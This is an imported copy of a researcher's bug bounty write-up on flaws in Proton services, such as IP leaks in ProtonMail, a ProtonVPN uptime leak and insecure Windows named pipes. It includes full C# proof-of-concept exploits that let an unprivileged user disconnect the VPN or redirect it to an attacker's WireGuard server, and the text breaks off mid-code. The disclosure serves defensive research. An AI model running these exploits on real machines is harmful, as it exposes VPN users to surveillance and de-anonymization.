---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-08_de-anonymization-attacks-against-proton-services.md
original_filename: 2022-06-08_de-anonymization-attacks-against-proton-services.md
title: De-Anonymization attacks against Proton services
category: documents
detected_topics:
- xss
- mobile-security
- supply-chain
- access-control
- command-injection
- otp
tags:
- imported
- documents
- xss
- mobile-security
- supply-chain
- access-control
- command-injection
- otp
language: en
raw_sha256: 78d3c0093ed84aab48a3f91e1121753904762b3fde9236f5d2081718d501de0e
text_sha256: 60544d7a5b073d3253ef1d7a5eb705c1d975ff4947c75c66a6559d9cb6293ac1
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# De-Anonymization attacks against Proton services

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-08_de-anonymization-attacks-against-proton-services.md
- Source Type: markdown
- Detected Topics: xss, mobile-security, supply-chain, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `78d3c0093ed84aab48a3f91e1121753904762b3fde9236f5d2081718d501de0e`
- Text SHA256: `60544d7a5b073d3253ef1d7a5eb705c1d975ff4947c75c66a6559d9cb6293ac1`


## Content

---
title: "De-Anonymization attacks against Proton services"
url: "https://www.reversemode.com/2022/06/de-anonymization-attacks-against-proton.html"
final_url: "https://www.reversemode.com/2022/06/de-anonymization-attacks-against-proton.html"
authors: ["Ruben Santamarta (@reversemode)"]
programs: ["Proton AG"]
bugs: ["Privacy issue", "Information disclosure", "HTML injection", "Local Privilege Escalation"]
publication_date: "2022-06-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2576
---

###  De-Anonymization attacks against Proton services 

[ June 08, 2022  ](https://www.reversemode.com/2022/06/de-anonymization-attacks-against-proton.html "permanent link")

In November 2021 [YesWeHack](https://yeswehack.com/) invited me to participate in a private bug bounty program organized by [Bug Bounty Switzerland](https://www.bugbounty.ch/en/home/) on behalf of Proton AG. 

The scope of the program was quite interesting and heterogeneous, as it covered most of the applications and services offered by Proton, such as ProtonMail and ProtonVPN. As a result, multiple technologies and codebases were in scope, ranging from typescript, in the open-source part of Protonmail, to .NET/Swift used by ProtonVPN apps for Windows and macOS respectively.

[Proton](https://proton.me/) is well-known for its privacy-driven services offer, so they are based on [Switzerland](https://proton.me/news/switzerland) where the legislation seems to match Proton's requirements to provide that kind of services: thus maximizing the privacy of their communications, minimizing the amount of data they log from their users while keeping a law-abiding status. 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnK9Fki5WNxe0ugZlIWyjf_PI6Xh3eUnY13weunFI-H36yCZ2NpJQKO9-bk1TB-3KT3hK-RzHgcWge-IXCbPB2srKuFARhspwq6AkmDXId8I0gOIr_PVOvnYwS0wvpaW30NdUss8ejZC0mfz32SVDQTHlzG3S1hQ9mLMZFITYiRJaHGzcpIKFS6pDkww/w400-h213/protonme_new.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnK9Fki5WNxe0ugZlIWyjf_PI6Xh3eUnY13weunFI-H36yCZ2NpJQKO9-bk1TB-3KT3hK-RzHgcWge-IXCbPB2srKuFARhspwq6AkmDXId8I0gOIr_PVOvnYwS0wvpaW30NdUss8ejZC0mfz32SVDQTHlzG3S1hQ9mLMZFITYiRJaHGzcpIKFS6pDkww/s1562/protonme_new.png)

  

  

It wouldn't be realistic to think of Proton users as an homogenous group; you may be using Proton because you're genuinely worried about your privacy (e.g journalists, activists...) but also there may be certain Proton users whose 'interests' are not as legitimate as the service they're using. As a result, Proton should be considered a target in which different actors (let's just say 'malicious' and 'non-inherently-malicious') are likely interested. So, from an offensive, and defensive, perspective this scenario has several implications, but I'd say that the most significant one is that, at a certain moment, it is guaranteed that almost all 'players', regardless of their consideration, will be interested in what they can obtain by targeting Proton services/users:

\- 'Non-inherently-malicious' actors, backed with nation-state resources, may target Proton's infrastructure at some points that are not usually reachable for regular malicious actors. These actors may not be natural adversaries of Switzerland (assuming this [country](https://en.wikipedia.org/wiki/Swiss_neutrality) has any), but the level of lawful collaboration provided by Proton may not be enough for them, or it is even 'non-convenient' to issue a legal requirement that may expose the operation to the individuals being investigated.

\- Malicious actors, including adversarial nation-states, will keep trying to gain access to Proton's data for their own interests.

Obviously, this shouldn't come as a surprise for anyone, much less for Proton staff. Otherwise, you wouldn't locate your datacenter on a former military bunker.

## Approach

In what seems a logical approach to keep up with their privacy claims, the client-side part of Proton's [services](https://github.com/protonmail) and [applications](https://github.com/protonvpn) are available as open-source. As I explained in similar posts, my preferred approach, when possible, is always static source code analysis, so in this case that was the main activity. Although this time, I also spent some time creating the exploits and PoCs required by the program to verify the issues and testing their web endpoints.

The codebase I used dated back to late 2021 (November), and the scope also included the beta versions (server-side) of some of the services such as Proton Drive and Calendar.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5MNvBGnTuCmXYmJmYMEc4zJ5D-Epga0ABSQX95jRVig524qxCLrC_FFIIRMoYi2oefZlyM1HmJPeCC_NIk9rJdys8ySWNL5hxk_vje9BzxHCRaLlZZOWVenkM4c6WvBDmCkd0-Uleccv6oNCSplvj1f1yJSMAB2d1retxR2FL8MW-9nmjuNniTrJyAw/w640-h236/products.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5MNvBGnTuCmXYmJmYMEc4zJ5D-Epga0ABSQX95jRVig524qxCLrC_FFIIRMoYi2oefZlyM1HmJPeCC_NIk9rJdys8ySWNL5hxk_vje9BzxHCRaLlZZOWVenkM4c6WvBDmCkd0-Uleccv6oNCSplvj1f1yJSMAB2d1retxR2FL8MW-9nmjuNniTrJyAw/s1516/products.png)

## Priorities

  

Target| | Main Language  
---|---|---  
Proton WebClients| | Typescript  
ProtonMail Android| | Kotlin/Java  
ProtonMail iOS| | Swift  
ProtonVPN MAC| | Swift  
ProtonVPN Windows| | C#  
  
My top priority was to find vulnerabilities that allowed to 'de-anonymize' users by leaking their IPs, which obviously is not necessarily a complete exposure, but within the context of Proton it poses a significant threat.

## Summary

ID| Title| Target  
---|---|---  
YWH-PGM3846-3| Windows App - OpenVPN's Insecure Random SID leaks system uptime.| ProtonVPN  
YWH-PGM3846-5| Windows App - Insecure WCF NetNamedPipeBindings allow local users to perform privileged operations| ProtonVPN  
YWH-PGM3846-6| macOS App - WireGuard/OpenVPN Extensions allow insecure XPC connections| ProtonVPN  
YWH-PGM3846-8| Improper sanitization of Zendesk Key allows html injection.| ProtonMail  
YWH-PGM3846-10| Remote content protection bypass while importing contacts from a VCF file| ProtonMail  
YWH-PGM3846-11| Draft message composer leaks user's IP due to a React Re-Render| ProtonMail  
YWH-PGM3846-12| Message composer leaks user's IP through a specially crafted 'mailto' link| ProtonMail  
YWH-PGM3846-13| App leaks User's IP when checking Contacts.| ProtonMail Android  
YWH-PGM3846-19| 'syncMultipleEvents' backend API allows to impersonate attendees and change 'SharedEventContent'| ProtonCalendar  
  
Although I reported additional issues, in this post I'm only elaborating those vulnerabilities that, from my point of view, may contribute with something useful for the reader, either by their impact or because they present some 'tricks' that may be re-used.

According to the 'Title' column in the table above, it is easy to note that I found quite a few issues that allowed to leak the user IP through different ways, although always requiring some kind of user interaction. However, that kind of user interaction is not anything exceptional but just the regular actions a ProtonMail user is used to (e.g reply to an email, import contacts...) In fact, Proton recently beefed up its [protection](https://proton.me/support/email-tracker-protection) against this kind of tracking mechanisms.

It is worth mentioning that the interaction with Proton has been nice and productive, so that's always a good thing. According to the information provided by Proton, all the vulnerabilities herein presented have been already fixed except for YWH-PGM3846-3, which will be addressed shortly.

Let's briefly analyze the most interesting issues before providing full technical details.

#### _YWH-PGM3846-3_

This vulnerability is certainly interesting, although the requirements to obtain any positive outcome from it (from an attacker's perspective) are pretty high, so it's likely limited to nation-state actors.

When the ProtonVPN Windows application checks for the availability of OpenVPN servers, it generates the handshake's 'Session ID' (8 bytes) by using the default .NET non-secure _[Random()](https://docs.microsoft.com/en-us/dotnet/api/system.random?view=net-6.0)_ generator. This is not bad per-se, as the own OpenVPN specification mentions the Session ID does not require a strong number generator. 

What's the issue then? You are implicitly leaking the system uptime. 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8fwgwvm0HTcQ85sKVBw1vcS6rdT-AiEB2QWFU2d7kiCqTzqdpafk6uW3HngT2Gj-zAGyQnctZ-Fn8dW6qE3yi473jMCy5fFqZnieUzlsgu27SAB3zJQZQb-jpF62ghjnDsFwx52_K7PlrCxXnhcUsVbcgHG11SP4kQeGmXOrajbt3TlGC2ENmNXIxNg/w640-h182/system_uptime.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8fwgwvm0HTcQ85sKVBw1vcS6rdT-AiEB2QWFU2d7kiCqTzqdpafk6uW3HngT2Gj-zAGyQnctZ-Fn8dW6qE3yi473jMCy5fFqZnieUzlsgu27SAB3zJQZQb-jpF62ghjnDsFwx52_K7PlrCxXnhcUsVbcgHG11SP4kQeGmXOrajbt3TlGC2ENmNXIxNg/s1624/system_uptime.png)

This basically means that the ProtonVPN Windows application is leaking the system uptime when pinging available OpenVPN servers, as a table of _Random()_ generated bytes, according to different system uptimes, can be precomputed and then used as a lookup mechanism.

A systematic, passive, tracking of the system uptime may provide valuable information for certain kind of operations:

\- Whether the target is using freshly generated VMs.

\- Identify devices behind NAT.

\- A solid time reference that can be used as starting point to track other deterministic connections, which may help to identify installed software, services (even when this traffic is encrypted)...

As a result, within the context of a VPN, these actions may enable traffic correlation attacks, assuming the attackers have visibility over a significant portion of the network, that's why the ability to leverage this issue is probably limited to nation-state actors only.

#### _YWH-PGM3846-5_

This issue already requires, unprivileged, malicious code running in the target's machine so the requirements are high. However, it's an interesting design issue that would enable an unprivileged user to trick the ProtonVPN Windows application into connecting to an attacker controlled [WireGuard](https://www.wireguard.com/) server. 

There are a couple of issues that paved the way to this attack. First, the ProtonVPN Windows App communicates with the ProtonVPN Service through a local IPC mechanism based on WCF NetNamedPipeBindings. This mechanism does not validate the client so any application is able to request specific actions (connect, disconnect) to the local ProtonVPN Service. Second, Proton WireGuard servers were not being validated before connecting to them.

If the attack is successfully executed, the victim will be inadvertently connected through the attacker controlled WireGuard server, so any traffic that is not encrypted before leaving the local machine's through the WireGuard interface could be eavesdropped. 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_Ynl8dnRJxR2vR8jBjS8-q867HI3FeLX5637fT6FnbMm3Fi4XRYmhmfycp9_5Ps2IbMhvEsv4HYy-GBu8-862NkJDekYMD6p-UuBoe3Hwtkr4fKgGNK1D7z8lP_CZL0ix-ojciy6wuVDHWg2gHZ5qexY63vL2Cm6V6nPo1vGF_MZMVgdFzF3R9XGlWg/w640-h440/connecting.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_Ynl8dnRJxR2vR8jBjS8-q867HI3FeLX5637fT6FnbMm3Fi4XRYmhmfycp9_5Ps2IbMhvEsv4HYy-GBu8-862NkJDekYMD6p-UuBoe3Hwtkr4fKgGNK1D7z8lP_CZL0ix-ojciy6wuVDHWg2gHZ5qexY63vL2Cm6V6nPo1vGF_MZMVgdFzF3R9XGlWg/s1906/connecting.png)

  

####  _YWH-PGM3846-{8,10,11,12,13}_

This set of vulnerabilities were focused on bypassing the ProtonMail's 'remote content' filters in order to leak the user's IP through different methods, such as specific fields in a VCARD file or unsanitized values in a web endpoint. 

I would highlight a couple of [React](https://reactjs.org/) 'tricks' that may be useful in other conditions, such as the 'Re-render' issue in YWH-PGM3846-11 and the 'http:/' to 'https://' promotion in YWH-PGM3846-10. I'm miles away from being a React expert so if this is well-known, you can just skip over it.

#### _YWH-PGM3846-19_

This issue allows to manipulate ProtonCalendar events in different ways. It was possible to impersonate any of the attendees to accept or reject an invitation on their behalf. This may be leveraged to generate a false sense of trust in order to trick the victim into attending an online event, which then can be used to perform either further attacks or de-anonymize the target.

  

Let's imagine you receive an invitation to a meeting, together with some people you certainly trust. When checking the event on ProtonCalendar you'd see those trustworthy individuals have already accepted the invitation, so there are more chances you accept it as well.

  

This attack was also able to corrupt the Calendar event, thus potentially adding malicious content to the event, an action which should be restricted to the owner of that event.

  

## Vulnerabilities

####  _  
_

#### _YWH-PGM3846-3 - ProtonVPN Windows App - OpenVPN's Insecure Random SID leaks system uptime._

#### _Description_

The ProtonVPN Windows Application uses a non-cryptographically secure PRNG to generate the OpenVPN's Session ID when testing the availability of ProtonVPN OpenVPN TCP servers.

  

For the same seed the implemented PRNG generates the same values. Since this PRNG is automatically seeded with the milliseconds since the system started, the system uptime is implicitly leaked.

  

Although a similar functionality is shared across the different ProtonVPN applications, only the Windows version uses this specific PRNG.

  

#### _Technical details_

At line 39 GetRandomBytes is invoked to generate the SID. Then at line 87 we can see Random() is used to generate those bytes.

  

File: proton/win-app/src/ProtonVPN.Vpn/OpenVpn/OpenVpnHandshake.cs
  
  
  26: namespace ProtonVPN.Vpn.OpenVpn
  27: {
  28:  internal class OpenVpnHandshake
  29:  {
  30:  private readonly byte[] _key;
  31: 
  32:  public OpenVpnHandshake(byte[] key)
  33:  {
  34:  _key = key;
  35:  }
  36: 
  37:  public byte[] Bytes(bool includeLength)
  38:  {
  39:  var sid = GetRandomBytes(8);
  40:  var ts = (int) DateTimeOffset.UtcNow.ToUnixTimeSeconds();
  41:  var packet = new List<object>();
  42:  packet.Add(1);
  43:  packet.Add(ts);
  44:  packet.Add((byte)(7 << 3));
  45:  foreach (var s in sid)
  46:  {
  47:  packet.Add(s);
  48:  }
  49:  packet.Add((byte)0);
  50:  packet.Add(0);
  51: 
  52:  using (var h = new HMACSHA512(_key))
  53:  {
  54:  var data = StructConverter.Pack(packet.ToArray(), false);
  55:  var hash = h.ComputeHash(data);
  56: 
  57:  var result = new List<object>();
  58:  result.Add((byte)(7 << 3));
  59:  foreach (var s in sid)
  60:  {
  61:  result.Add(s);
  62:  }
  63: 
  64:  foreach (var hs in hash)
  65:  {
  66:  result.Add(hs);
  67:  }
  68: 
  69:  result.Add(1);
  70:  result.Add(ts);
  71:  result.Add((byte)0);
  72:  result.Add(0);
  73: 
  74:  var bytes = StructConverter.Pack(result.ToArray(), false);
  75:  if (!includeLength)
  76:  {
  77:  return bytes;
  78:  }
  79: 
  80:  var length = StructConverter.Pack(new object[] { (ushort)bytes.Length }, false);
  81:  return length.Concat(bytes).ToArray();
  82:  }
  83:  }
  84: 
  85:  private byte[] GetRandomBytes(int length)
  86:  {
  87:  var rnd = new Random();
  88:  var b = new byte[length];
  89:  rnd.NextBytes(b);
  90:  return b;
  91:  }
  92:  }

  

As we can see in the '[random.cs](http://random.cs)' implementation, this instance of [Random()](https://docs.microsoft.com/en-us/dotnet/api/system.random?view=net-6.0) will be automatically seeded with the '_TickEnvironment.TickCount_ ' 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCgaSbxmKomYZcatECM87OOCMZ6GmVCUwvOUzvdvUCYEDtWzwtdGqch3P5I_qbLwR8nqioZS2WPSurSmgH3PceEAXG8sfMiUq20yVM41-nXIJ4ZarlKe4kM__bvpXUYGnNf6K9B5KTLBKPf-IDIAspQTkiIpxDA6Y1yMPnPt3MjVDlF10pLtkqtAEIIQ/w400-h63/random.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCgaSbxmKomYZcatECM87OOCMZ6GmVCUwvOUzvdvUCYEDtWzwtdGqch3P5I_qbLwR8nqioZS2WPSurSmgH3PceEAXG8sfMiUq20yVM41-nXIJ4ZarlKe4kM__bvpXUYGnNf6K9B5KTLBKPf-IDIAspQTkiIpxDA6Y1yMPnPt3MjVDlF10pLtkqtAEIIQ/s890/random.png)

  

This value is a 32-bit signed integer containing the amount of time in milliseconds that has passed since the last time the computer was started

  

<https://docs.microsoft.com/en-us/dotnet/api/system.environment.tickcount?view=net-5.0>

  

The reference for _System.Random_ explicitly mentions that '_If the same seed is used for separate Random objects, they will generate the same series of random numbers_ '

  

<https://docs.microsoft.com/en-us/dotnet/api/system.random?view=net-5.0>

  

As a result, it is possible to build a precomputed table of random values generated by _Random()_ for different seeds (uptimes). Then it is trivial to compute the system uptime by looking up the captured SessionID value into this table.

  

Sophisticated/state-backed actors with a privileged position in the network may use the ability of computing the target's uptime based on passive traffic analysis as a point of reference within the vast amount of traffic collected.

  

From this system uptime reference, there are certain implicit values that can be known (Windows system, .NET version) that can be leveraged to identify patterns in the target's traffic, thus facilitating correlation attacks.

  

e.g By using this reference, a backwards traffic analysis will reveal those deterministic connections established at system boot while forward traffic analysis may facilitate different correlation/timing attack approaches.

  

#### _YWH-PGM3846-5 - Windows App - Insecure WCF NetNamedPipeBindings allow local users to perform privileged operations_

####  _Description_

The ProtonVPN Windows App communicates with two of the ProtonVPN Services (ProtonVPNService and ProtonVPN.UpdateService) through a local IPC mechanism based on WCF [NetNamedPipeBindings](https://docs.microsoft.com/en-us/dotnet/api/system.servicemodel.netnamedpipebinding?view=netframework-4.8).

  

This IPC mechanism has been implemented using the default security settings. As a result, any regular (non-admin) authenticated user different than the one who installed the ProtonVPN Windows App is able to perform the same operations the legitimate application may perform: update the app, disconnect and connect the VPN using custom settings.

#### _Technical details_

 _  
_

The following class generates the NetNamedPipeBinding without adding any additional security check.

  

File: win-app-master\src\ProtonVPN.Core\Service\ServiceChannelFactory.cs

  

  
  
  using System.ServiceModel;
  
  namespace ProtonVPN.Core.Service
  {
  public class ServiceChannelFactory
  {
  public ServiceChannel<T> Create<T>(string endpoint, object callback)
  {
  InstanceContext context = new InstanceContext(callback);
  
  DuplexChannelFactory<T> factory = new DuplexChannelFactory<T>(
  context,
  new NetNamedPipeBinding(),
  GetEndPointAddress(endpoint));
  
  return new ServiceChannel<T>(factory, factory.CreateChannel());
  }
  
  public ServiceChannel<T> Create<T>(string endpoint)
  {
  ChannelFactory<T> factory = new ChannelFactory<T>(
  new NetNamedPipeBinding(),
  GetEndPointAddress(endpoint));
  
  return new ServiceChannel<T>(factory, factory.CreateChannel());
  }
  
  private static EndpointAddress GetEndPointAddress(string endpointName)
  {
  return new($"net.pipe://localhost/{endpointName}");
  }
  }
  }

  

There are three different endpoints that can be reached from potential unprivileged applications:

  

net.pipe://localhost/protonvpn-service/connection

net.pipe://localhost/protonvpn-service/settings

net.pipe://localhost/protonvpn-update-service/update

  

The '_connection_ ' endpoint exposes two of the most significant functionalities: 'Connect' and 'Disconnect'.

  

The settings used by these methods will be controlled by the attacker through the different DataMembers in the contract. For instance, the following represents the options for the 'Connect' functionality, which includes credentials, hostnames, IPs, Ports, VPN settings...

  

File: win-app-master\src\ProtonVPN.Service.Contract\Vpn\VpnConnectionRequestContract.cs
  
  
  [DataMember(IsRequired = true)]
  public VpnHostContract[] Servers { get; set; }
  
  [DataMember(IsRequired = true)]
  public VpnProtocolContract Protocol { get; set; }
  
  [DataMember(IsRequired = true)]
  public VpnConfigContract VpnConfig { get; set; }
  
  [DataMember(IsRequired = true)]
  public VpnCredentialsContract Credentials { get; set; }
  
  [DataMember(IsRequired = true)]
  public SettingsContract Settings { get; set; }

  

From the ProtonVPN app perspective, the following code implements the Connection with the ProtonVPNService Connection contract.

  

File: win-app-master\src\ProtonVPN.App\Core\Service\Vpn\vpnService.cs

  

  
  
  ...
  private ServiceChannel<IVpnConnectionContract> NewChannel()
  {
  ServiceChannel<IVpnConnectionContract> channel = _channelFactory.Create<IVpnConnectionContract>(
  "protonvpn-service/connection",
  _vpnEvents);
  
  RegisterCallback(channel);
  
  return channel;
  }
  ...

The different methods implemented in the Connection contract (Connect, Disconnect,...) are implemented in 'ProtonVPNService.cs'. For instance, we can see the 'Disconnect' method below.

  

File: win-app-master\src\ProtonVPN.Service\ProtonVPNService.cs
  
  
  ...
  public Task Disconnect(SettingsContract settings, VpnErrorTypeContract vpnError)
  {
  _logger.Info($"Disconnect requested (Error: {vpnError})");
  
  _serviceSettings.Apply(settings);
  
  _vpnConnection.Disconnect(Map(vpnError));
  
  return Task.CompletedTask;
  }
  ...

  

#### _Exploits_

The following PoC disconnects the VPN

  

  
  
  /* -----------------
  * Compiling 
  * ------------------
  * Aggregate the following references to the Visual Studio C# Console App project
  * 
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.Common.dll
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.Core.dll
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.ServiceContract.dll
  * 
  * Install System.ServiceModel Package  (Tools->Nuget Package Administrator->Console) by running the following command (https://www.nuget.org/packages/System.ServiceModel.Http)
  * 
  * PM> Install-Package System.ServiceModel.Http -Version 4.8.1
  * 
  *-----------------------------------
  * Steps to reproduce the issue.
  * ----------------------------------
  *  1. Add a regular user 'B' in the Windows Machine where ProtonVPN has been installed  by the admin user 'A'.
  *  2. Run ProtonVPN and connect it to a server using the admin user account 'A'. 
  *  3. Compile the PoC. Run the resulting binary using the regular user account 'B'.
  *  4. ProtonVPN will be disconnected.
  * 
  *
  */
  
  using System;
  using System.Collections.Generic;
  using System.Linq;
  using System.Text;
  using System.Threading.Tasks;
  using System.Windows;
  using System.ServiceModel;
  using ProtonVPN.Common;
  using ProtonVPN.Common.Networking;
  using ProtonVPN.Service.Contract.Settings;
  using ProtonVPN.Core.Service;
  using ProtonVPN.Core.Settings;
  using ProtonVPN.Core.Settings.Contracts;
  using ProtonVPN.Common.KillSwitch;
  using ProtonVPN.Service.Contract.Vpn;
  
  namespace ConsoleApp1
  {
  class Program
  {
  
  static void disconnect()
  {
  VpnEvents _vpnEvents;
  ServiceChannelFactory _service;
  VpnServiceClient _vpnClient;
  SettingsContract _settingsContract;
  VpnErrorTypeContract _vpnErrorContract;
  
  _service = new ServiceChannelFactory();
  _vpnEvents = new VpnEvents();
  _vpnClient = new VpnServiceClient(_service, _vpnEvents);
  
  _settingsContract = new SettingsContract();
  _settingsContract.SplitTunnel = new SplitTunnelSettingsContract();
  _settingsContract.SplitTunnel.AppPaths = new String[] { "c:\\random\\application.exe" };
  _settingsContract.SplitTunnel.Mode = SplitTunnelMode.Permit;
  _settingsContract.SplitTcp = true;
  _settingsContract.NetShieldMode = 1337;
  _settingsContract.Ipv6LeakProtection = false;
  
  _settingsContract.KillSwitchMode = KillSwitchMode.Off;
  _settingsContract.OpenVpnAdapter = OpenVpnAdapter.Tun;
  _settingsContract.VpnProtocol = VpnProtocol.OpenVpnTcp;
  
  _vpnErrorContract = VpnErrorTypeContract.IncorrectVpnConfig;
  Console.WriteLine("[+] Disconnecting the VPN with 'Incorrect Vpn Config' error ");
  _vpnClient.DoDisconnect(_settingsContract, _vpnErrorContract);
  
  }
  
  static void Main(string[] args)
  {
  Console.WriteLine("___ ProtonVPN app - Insecure netNamedPipeBindings - PoC ___");
  disconnect();
  
  }
  }
  
  public class ServiceChannelFactory
  {
  
  public ServiceChannel<T> Create<T>(string endpoint, object callback)
  {
  DuplexChannelFactory<T> duplexChannelFactory = new DuplexChannelFactory<T>(new InstanceContext(callback), new NetNamedPipeBinding(), GetEndPointAddress(endpoint));
  return new ServiceChannel<T>(duplexChannelFactory, duplexChannelFactory.CreateChannel());
  }
  public ServiceChannel<T> Create<T>(string endpoint)
  {
  ChannelFactory<T> channelFactory = new ChannelFactory<T>(new NetNamedPipeBinding(), GetEndPointAddress(endpoint));
  return new ServiceChannel<T>(channelFactory, channelFactory.CreateChannel());
  }
  
  private static EndpointAddress GetEndPointAddress(string endpointName)
  {
  return new EndpointAddress("net.pipe://localhost/" + endpointName);
  }
  }
  
  public class VpnServiceClient
  {
  private const string Endpoint = "protonvpn-service/connection";
  
  private readonly ServiceChannelFactory _channelFactory;
  private readonly VpnEvents _vpnEvents;
  
  public VpnServiceClient(ServiceChannelFactory channelFactory, VpnEvents vpnEvents)
  {
  _channelFactory = channelFactory;
  _vpnEvents = vpnEvents;
  }
  
  public void DoDisconnect(SettingsContract settings, VpnErrorTypeContract vpnError)
  {
  ServiceChannel<IVpnConnectionContract> channel = _channelFactory.Create<IVpnConnectionContract>(Endpoint,_vpnEvents);
  
  channel.Proxy.RegisterCallback();
  channel.Proxy.Disconnect(settings, vpnError);
  Console.WriteLine("[+] Wait several seconds until disconnection...then press enter to quit. ");
  Console.ReadLine();
  }
  
  }
  
  [CallbackBehavior(
  ConcurrencyMode = ConcurrencyMode.Single,
  UseSynchronizationContext = false)]
  public class VpnEvents : IVpnEventsContract
  {
  public event EventHandler<VpnStateContract> VpnStateChanged;
  public event EventHandler<ServiceSettingsStateContract> ServiceSettingsStateChanged;
  
  public void OnStateChanged(VpnStateContract e)
  {
  Action action = () => VpnStateChanged?.Invoke(this, e);
  
  }
  
  public void OnServiceSettingsStateChanged(ServiceSettingsStateContract e)
  {
  Action action = () => ServiceSettingsStateChanged?.Invoke(this, e);
  
  }
  }
  
  }

  

  

The following PoC connects to an arbitrary WireGuard server.

  

  
  
  * -----------------
  * Compiling 
  * ------------------
  * Aggregate the following references to the Visual Studio .NET Console App project
  * 
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.Common.dll
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.Core.dll
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.Crypto.dll
  * C:\Program Files (x86)\Proton Technologies\ProtonVPN\ProtonVPN.ServiceContract.dll
  * 
  * Install System.ServiceModel Package  (Tools->Nuget Package Administrator->Console) by running the following command (https://www.nuget.org/packages/System.ServiceModel.Http)
  * 
  * PM> Install-Package System.ServiceModel.Http -Version 4.8.1
  * 
  *-----------------------------------
  * Steps to simulate an arbitrary connection to an attacker-controlled Wireguard server..
  * ----------------------------------
  *  1. Add a regular user 'B' in the Windows Machine where ProtonVPN has been installed  by the admin user 'A'.
  *  
  *  2. Configure the IP of the fake Wireguard server at line 145
  *  3. At the box with the fake wireguard Server IP, run the 'pocpong.py' script to simulate the response to the Ping that the ProtonVPN app sends to their servers before connecting.
  *  4. Compile and execute this PoC using the regular user account 'B'
  *  5. ProtonVPN will proceed as follows (Use Wireshark to validate)
  *  5.1 It will ping your fake Wireguard Server
  *  5.2 The pocpong.py should respond to the ping
  *  5.3 ProtonVPN will initiate the Wireguard handshake 
  *  5.4 As it can't complete the handshake it will move to another server. (Press 'Cancel' in the ProtonVPN application if you don't want to continue connecting)
  *  6. Check the logs at c:\ProgramData\ProtonVPN\Logs\service-logs.txt  for a sequence like the following (you'll see your fake wireguard server IP instead of 192.168.1.144)
  *  -----
  *  INFO Connect requested
  INFO Callbacking VPN service settings change. Current state: Disconnected (Error: None)
  INFO Starting the service "ProtonVPNCallout"
  INFO Starting the service "ProtonVPNCallout" succeeded
  INFO Firewall: Blocking internet
  ...
  INFO Starting port scanning of endpoint 192.168.1.144 before connection.
  INFO Pinging VPN endpoint 192.168.1.144:51820 for WireGuard protocol.
  INFO The endpoint 192.168.1.144:51820 was the fastest to respond.
  INFO Connecting to 192.168.1.144:51820 as it responded fastest.
  INFO VPN state changed: Reconnecting, Error: None, LocalIP: , RemoteIP: 192.168.1.144, Label: 24
  INFO Callbacking VPN state Reconnecting (Error: None)
  INFO [LocalAgentWrapper] Connect action started
  INFO [WireGuardConnection] connect action started.
  INFO VPN state changed: Reconnecting, Error: None, LocalIP: 10.2.0.2, RemoteIP: 192.168.1.144, Label: 24
  INFO [WireGuardConnection] starting service.
  INFO Starting the service "ProtonVPN WireGuard"
  INFO [TUN] [ProtonVPN] Starting WireGuard/0.4.9 (Windows 10.0.19041; amd64)
  INFO [TUN] [ProtonVPN] Watching network interfaces
  INFO [TUN] [ProtonVPN] Resolving DNS names
  INFO [TUN] [ProtonVPN] Creating network adapter
  INFO [TUN] [ProtonVPN] WireGuardCreateAdapter: Creating adapter
  INFO [TUN] [ProtonVPN] SelectDriver: Using existing driver 0.8
  INFO [TUN] [ProtonVPN] Using WireGuardNT/0.8
  INFO [TUN] [ProtonVPN] Dropping privileges
  INFO [TUN] [ProtonVPN] Setting interface configuration
  INFO [TUN] [ProtonVPN] Interface created
  INFO [TUN] [ProtonVPN] Peer 1 created
  INFO [TUN] [ProtonVPN] Monitoring MTU of default v4 routes
  INFO [TUN] [ProtonVPN] Interface up
  INFO VPN state changed: AssigningIp, Error: None, LocalIP: 10.2.0.2, RemoteIP: 192.168.1.144, Label: 24
  INFO Callbacking VPN state AssigningIp (Error: None)
  ERROR [LocalAgentWrapper] Failed to connect to TLS channel: tls: failed to find any PEM data in certificate input
  ...
  INFO [TUN] [ProtonVPN] Monitoring MTU of default v6 routes
  INFO [TUN] [ProtonVPN] Setting device v6 addresses
  INFO [TUN] [ProtonVPN] Startup complete
  INFO [TUN] [ProtonVPN] Sending handshake initiation to peer 1 (192.168.1.144:51820)
  ...
  INFO Callbacking VPN state Disconnected (Error: Unknown)
  --------
  
  *
  */
  
  using System;
  using System.Collections.Generic;
  using System.Linq;
  using System.Text;
  using System.Threading.Tasks;
  using System.Windows;
  using System.ServiceModel;
  using ProtonVPN.Crypto;
  using ProtonVPN.Common;
  using ProtonVPN.Common.Networking;
  using ProtonVPN.Service.Contract.Settings;
  using ProtonVPN.Service.Contract.Servers;
  using ProtonVPN.Service.Contract.Vpn;
  using ProtonVPN.Service.Contract.Crypto;
  using ProtonVPN.Core.Service;
  using ProtonVPN.Core.Settings;
  using ProtonVPN.Core.Settings.Contracts;
  using ProtonVPN.Common.KillSwitch;
  
  namespace ConsoleApp1
  {
  class Program
  {
  
  static void doConnect()
  {
  VpnEvents _vpnEvents;
  ServiceChannelFactory _service;
  VpnServiceClient _vpnClient;
  SettingsContract _settingsContract;
  VpnCredentialsContract _Credentials = new VpnCredentialsContract();
